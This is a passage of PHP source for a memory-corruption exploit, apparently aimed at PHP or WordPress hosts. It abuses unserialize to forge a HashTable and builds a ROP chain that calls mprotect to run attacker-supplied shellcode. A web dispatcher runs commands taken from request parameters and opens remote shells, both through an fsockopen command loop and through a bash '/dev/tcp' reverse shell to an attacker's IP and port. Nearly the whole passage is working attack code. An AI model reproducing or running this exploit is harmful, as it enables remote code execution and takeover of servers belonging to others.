            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            if ($slen < strlen($needle)) continue;

            $scan_len = min($slen, 0x200000 - 0x08);
            $scan = substr($str, 0, $scan_len);
            $search_from = 0;
            while (($pos = strpos($scan, $needle, $search_from)) !== false) {
                $candidate = $pos - $relative_offset;
                if (
                    $candidate >= 0
                    && (
                        $expected_prefix === ''
                        || substr($scan, $candidate, strlen($expected_prefix))
                            === $expected_prefix
                    )
                ) return $chunk + 0x08 + $candidate;
                $search_from = $pos + 1;
            }
        }
        return false;
    }

    private function patch_rop_blob($offset, $data) {
        for ($i = 0; $i < strlen($data); $i++)
            $GLOBALS['_rop_blob'][$offset + $i] = $data[$i];
    }

    private function append_rop_call(&$chain, $chain_addr, $function, $arguments, $gadgets) {
        foreach ($arguments as $register => $value) {
            $name = 'pop_' . $register . '_ret';
            if (!isset($gadgets[$name])) return false;
            $chain[] = $gadgets[$name];
            $chain[] = $value;
        }
        // SysV AMD64 function entry requires RSP % 16 == 8. A bare ret shifts
        // the heap stack by one word when the current chain parity is wrong.
        $entry_rsp = $chain_addr + (count($chain) + 1) * 8;
        if (($entry_rsp & 0xf) !== 8) $chain[] = $gadgets['ret'];
        $chain[] = $function;
        return true;
    }

    private function pack_chain($chain) {
        $raw = '';
        foreach ($chain as $word) $raw .= pack('P', $word);
        return $raw;
    }

    private function load_pic_payload() {
        $encoded = isset($_REQUEST['wpr_pic']) ? (string) $_REQUEST['wpr_pic'] : '';
        if ($encoded === '') {
            die("[-] WP2SHELL_ROP_ERROR:missing payload\n");
        }
        $payload = base64_decode($encoded, true);
        if ($payload === false) {
            die("[-] WP2SHELL_ROP_ERROR:invalid base64 payload\n");
        }
        $length = strlen($payload);
        if ($length < 1) {
            die("[-] WP2SHELL_ROP_ERROR:empty payload\n");
        }
        if ($length > 0x10000) {
            die("[-] WP2SHELL_ROP_ERROR:payload too large\n");
        }
        return $payload;
    }

    private function run_pic_rop($heap_addr, $image, $tags, $symbols, $gadgets, $pic) {
        $mprotect = $this->resolve_jump_slot($image, $tags, $symbols, 'mprotect');
        $php_printf = $this->resolve_defined_symbol($image, $symbols, 'php_printf');
        $bailout = $this->resolve_defined_symbol($image, $symbols, '_zend_bailout');
        if ($mprotect === false || $php_printf === false || $bailout === false)
            die("[-] Cannot resolve mprotect/php_printf/_zend_bailout\n");
        printf("[+] mprotect target: 0x%x\n", $mprotect);
        printf("[+] php_printf:     0x%x\n", $php_printf);
        printf("[+] _zend_bailout:  0x%x\n", $bailout);

        $fake_ht_off = 0x40;
        $chain_off = 0x100;
        $payload_off = 0x300;
        $message = "[+] WP2SHELL_ROP_RETURNED\n\x00";
        $message_off = ($payload_off + strlen($pic) + 0x1f) & ~0x1f;
        $marker_off = ($message_off + strlen($message) + 0x3f) & ~0x3f;
        $blob_size = max(0x800, ($marker_off + 0x100 + 0xff) & ~0xff);
        if ($blob_size > 0x20000) {
            die("[-] WP2SHELL_ROP_ERROR:blob too large\n");
        }
        $prefix = "WP2SHELL_SERIALIZABLE_ROP\x00";
        $marker = random_bytes(16);
        $GLOBALS['_rop_blob'] = $prefix . str_repeat("\x00", $blob_size - strlen($prefix));
        $this->patch_rop_blob($marker_off, $marker);

        $blob_addr = $this->find_bytes_in_heap(
            $heap_addr,
            $marker,
            $marker_off,
            $prefix
        );
        if ($blob_addr === false) die("[-] Cannot locate the ROP blob in the current heap\n");
        printf("[+] Controlled blob: 0x%x\n", $blob_addr);

        $fake_ht = $blob_addr + $fake_ht_off;
        $chain_addr = $blob_addr + $chain_off;
        $payload_addr = $blob_addr + $payload_off;
        $message_addr = $blob_addr + $message_off;
        $page = $blob_addr & ~0xfff;
        $protect_len = (($blob_addr + $blob_size + 0xfff) & ~0xfff) - $page;

        $this->patch_rop_blob($payload_off, $pic);
        $this->patch_rop_blob($message_off, $message);

        $chain = [];
        if (!$this->append_rop_call($chain, $chain_addr, $mprotect, [
            'rdi' => $page,
            'rsi' => $protect_len,
            'rdx' => 7,
        ], $gadgets)) die("[-] Cannot construct mprotect call\n");
        $chain[] = $payload_addr;
        if (!$this->append_rop_call($chain, $chain_addr, $mprotect, [
            'rdi' => $page,
            'rsi' => $protect_len,
            'rdx' => 3,
        ], $gadgets)) die("[-] Cannot construct mprotect restore call\n");
        if (!$this->append_rop_call($chain, $chain_addr, $php_printf, [
            'rdi' => $message_addr,
            'rax' => 0,
        ], $gadgets)) die("[-] Cannot construct php_printf call\n");
        if (!$this->append_rop_call($chain, $chain_addr, $bailout, [
            'rdi' => 0,
            'rsi' => 0,
        ], $gadgets)) die("[-] Cannot construct bailout call\n");
        $this->patch_rop_blob($chain_off, $this->pack_chain($chain));

        // The first pivot uses RBP=fake HashTable in zend_hash_destroy. The
        // second pivot consumes arData as the new RSP and starts at chain_addr.
        $ht = pack('V2', 1, 7);
        $ht .= pack('P', $gadgets['pop_rsp_ret']);
        $ht .= pack('P', $chain_addr);
        $ht .= pack('V2', 1, 1);
        $ht .= pack('V2', 1, 0);
        $ht .= pack('P', 0);
        $ht .= pack('P', $gadgets['leave_ret']);
        $this->patch_rop_blob($fake_ht_off, $ht);

        printf("[+] Fake HashTable: 0x%x\n", $fake_ht);
        printf("[+] ROP stack:      0x%x (%d qwords)\n", $chain_addr, count($chain));
        printf("[+] PIC buffer:     0x%x (%d bytes)\n", $payload_addr, strlen($pic));
        printf("[+] mprotect:       0x%x + 0x%x, RWX\n", $page, $protect_len);
        printf("[+] Payload SHA-256: %s\n", hash('sha256', $pic));
        echo "[*] WP2SHELL_ROP_DISPATCHING\n";
        wp2shell_snapshot_rop_log();
        @ob_flush();
        @flush();

        $spray = $this->build_spray_isarray($fake_ht);
        $payload = $this->build_payload($spray, 1);
        $result = @unserialize($payload);
        if ($result === false) die("[-] Final unserialize failed\n");
        $idx = self::SPRAY_COUNT + 1;
        if (!is_array($result[$idx])) die("[-] Expected the forged array zval\n");
        // R:N produces an IS_REFERENCE wrapper. Replacing the referenced value
        // destroys the forged inner IS_ARRAY immediately; unsetting only the
        // outer element would merely decrement the reference container.
        $result[$idx] = null;
        die("[-] ROP chain returned unexpectedly\n");
    }

    private function dispatch_web($system) {
        $wpr_mode = isset($_REQUEST['wpr_mode']) ? (string) $_REQUEST['wpr_mode'] : '';
        $wpr_payload_b64 = isset($_REQUEST['wpr_payload']) ? (string) $_REQUEST['wpr_payload'] : '';
        $wpr_payload = base64_decode($wpr_payload_b64, true);

        if ($wpr_payload === false) {
            printf("\n[-] WP2SHELL_SAFE_ERROR:invalid base64 action payload\n");
        } elseif ($wpr_mode === 'cmd') {
            if ($wpr_payload === '') {
                printf("\n[-] WP2SHELL_SAFE_ERROR:empty command\n");
            } else {
                printf("\n[+] WP2SHELL_SAFE_CMD_BEGIN\n");
                $system($wpr_payload);
                printf("\n[+] WP2SHELL_SAFE_CMD_END\n");
            }
        } elseif ($wpr_mode === 'cb' || $wpr_mode === 'bash_cb') {
            $wpr_callback = explode(':', $wpr_payload, 2);
            $wpr_host = count($wpr_callback) === 2 ? $wpr_callback[0] : '';
            $wpr_port_text = count($wpr_callback) === 2 ? $wpr_callback[1] : '';
            $wpr_port = (int) $wpr_port_text;
            $wpr_valid_host = filter_var(
                $wpr_host,
                FILTER_VALIDATE_IP,
                FILTER_FLAG_IPV4
            ) !== false;
            $wpr_valid_port = preg_match('/\A[0-9]+\z/D', $wpr_port_text) === 1
                && $wpr_port >= 1
                && $wpr_port <= 65535;

            if (!$wpr_valid_host || !$wpr_valid_port) {
                printf("\n[-] WP2SHELL_SAFE_ERROR:callback must be IPv4:port\n");
            } elseif ($wpr_mode === 'cb') {
                ignore_user_abort(true);
                set_time_limit(0);
                printf("\n[*] WP2SHELL_SAFE_CB_CONNECTING:%s:%d\n", $wpr_host, $wpr_port);
                $wpr_errno = 0;
                $wpr_errstr = '';
                $wpr_socket = @fsockopen(
                    $wpr_host,
                    $wpr_port,
                    $wpr_errno,
                    $wpr_errstr,
                    10
                );
                if ($wpr_socket === false) {
                    printf(
                        "\n[-] WP2SHELL_SAFE_ERROR:fsockopen failed (%d: %s)\n",
                        $wpr_errno,
                        $wpr_errstr
                    );
                } else {
                    stream_set_blocking($wpr_socket, true);
                    fwrite(
                        $wpr_socket,
                        sprintf(
                            "WP2SHELL PHP callback connected (%s; PHP %s; %s)\n",
                            get_current_user(),
                            PHP_VERSION,
                            PHP_SAPI
                        )
                    );
                    while (!feof($wpr_socket)) {
                        fwrite($wpr_socket, "php-safe> ");
                        $wpr_line = fgets($wpr_socket, 8192);
                        if ($wpr_line === false) {
                            break;
                        }
                        $wpr_line = rtrim($wpr_line, "\r\n");
                        if ($wpr_line === 'exit' || $wpr_line === 'quit') {
                            break;
                        }
                        if ($wpr_line === '') {
                            continue;
                        }
                        ob_start();
                        $system($wpr_line . ' 2>&1');
                        $wpr_output = ob_get_clean();
                        if ($wpr_output === false) {
                            $wpr_output = '';
                        }
                        fwrite($wpr_socket, $wpr_output);
                        if ($wpr_output === '' || substr($wpr_output, -1) !== "\n") {
                            fwrite($wpr_socket, "\n");
                        }
                    }
                    fclose($wpr_socket);
                    printf(
                        "\n[+] WP2SHELL_SAFE_CB_CLOSED:%s:%d\n",
                        $wpr_host,
                        $wpr_port
                    );
                }
            } else {
                $wpr_command = sprintf(
                    "/bin/bash -c 'exec /bin/bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &",
                    $wpr_host,
                    $wpr_port
                );
                printf(
                    "\n[*] WP2SHELL_SAFE_BASH_CB_LAUNCH:%s:%d\n",
                    $wpr_host,
                    $wpr_port
                );
                $system($wpr_command);
                printf(
                    "\n[+] WP2SHELL_SAFE_BASH_CB_DISPATCHED:%s:%d\n",
                    $wpr_host,
                    $wpr_port
                );
            }
        } else {
            printf("\n[-] WP2SHELL_SAFE_ERROR:unknown action mode\n");
        }
    }

    public function run() {
        printf("[+] PHP %s / %s\n", PHP_VERSION, php_uname('m'));

        echo "[*] Leaking a heap pointer\n";
        $heap_addr = $this->heap_leak();
        printf("[+] Heap pointer: 0x%x\n", $heap_addr);

        echo "[*] Finding Closure metadata\n";
        $ptrs = $this->find_object_pointers($heap_addr);
        if ($ptrs === false) die("[-] Cannot find object pointers\n");
        [$ce_closure, $closure_handlers] = $ptrs;

        echo "[*] Locating executor globals\n";
        $ft = $this->find_function_table_ht($closure_handlers, $heap_addr);
        if ($ft === false) die("[-] Cannot find function_table HT\n");
        $combined = $ft['delta'] + $ft['ft_off'];
        $st_addr = $this->find_symbol_table($closure_handlers, $combined, $heap_addr);
        if ($st_addr === false)
            echo "[!] Direct symbol lookup unavailable\n";

        echo "[*] Resolving the live PHP ELF image\n";
        $anchor = $this->enabled_handler($ft['arData'], $ft['nTableMask']);
        if ($anchor === false) die("[-] Cannot obtain an enabled handler anchor\n");
        $image = $this->find_php_elf($anchor);
        if ($image === false) die("[-] Cannot validate the PHP ELF base\n");
        $tags = $this->dynamic_tags($image);
        if ($tags === false) die("[-] Cannot parse PT_DYNAMIC\n");
        $symbols = $this->dynamic_symbols($image, $tags);
        if ($symbols === false) die("[-] Cannot parse the dynamic symbol tables\n");

        echo "[*] Scanning executable PT_LOAD segments for gadgets\n";
        $gadgets = $this->scan_gadgets($image);
        if ($gadgets === false) die("[-] A required runtime gadget is unavailable\n");

        $pic = $this->load_pic_payload();
        echo "[*] Constructing the PIC/ROP payload chain\n";
        $this->run_pic_rop($heap_addr, $image, $tags, $symbols, $gadgets, $pic);
    }
}

(new Exploit)->run();
